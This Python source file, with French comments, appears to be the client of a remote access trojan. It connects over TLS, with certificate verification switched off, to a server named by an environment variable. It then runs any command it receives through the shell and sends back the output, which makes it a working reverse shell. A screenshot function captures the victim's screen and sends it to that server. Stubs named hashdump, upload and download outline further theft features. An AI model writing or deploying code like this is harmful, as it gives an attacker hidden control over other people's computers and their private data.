import socket
import ssl
import subprocess
import os
from dotenv import load_dotenv
from PIL import ImageGrab  # Importer ImageGrab depuis Pillow

SERVER_PORT = 8888

def menu_help(ssl_socket):
    print('help')

def download(ssl_socket):
    print('download')

def upload(ssl_socket):
    print('upload')

def shell(ssl_socket):
    print('shell')

def ipconfig(ssl_socket):
    print('ipconfig')

def screenshot(ssl_socket):
    screenshot = ImageGrab.grab()  # Capturer l'écran
    screenshot.save('screenshot.png')  # Sauvegarder la capture d'écran dans un fichier
    with open('screenshot.png', 'rb') as screenshot_file:
        while True:
            screenshot_to_send = screenshot_file.read(4096)
            if not screenshot_to_send:
                break
            ssl_socket.send(screenshot_to_send)
    ssl_socket.send(b'END')

def search(ssl_socket):
    print('search')

def hashdump(ssl_socket):
    print('hashdump')

def main():
    load_dotenv()
    ip_server = os.getenv('IP_SERVER')

    # Créer un contexte SSL
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server)
    ssl_socket.connect((ip_server, SERVER_PORT))

    while True:
        command = ssl_socket.recv(1024).decode()
        if command.lower() == 'help':
            menu_help(ssl_socket)
        elif command.lower() == 'download':
            download(ssl_socket)
        elif command.lower() == 'upload':
            upload(ssl_socket)
        elif command.lower() == 'shell':
            shell(ssl_socket)
        elif command.lower() == 'ipconfig':
            ipconfig(ssl_socket)
        elif command.lower() == 'screenshot':
            screenshot(ssl_socket)
        elif command.lower() == 'search':
            search(ssl_socket)
        elif command.lower() == 'hashdump':
            hashdump(ssl_socket)
        elif command.lower() == 'exit':
            break
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            ssl_socket.send(result.stdout.encode() + result.stderr.encode())

    ssl_socket.close()

if __name__ == "__main__":
    main()
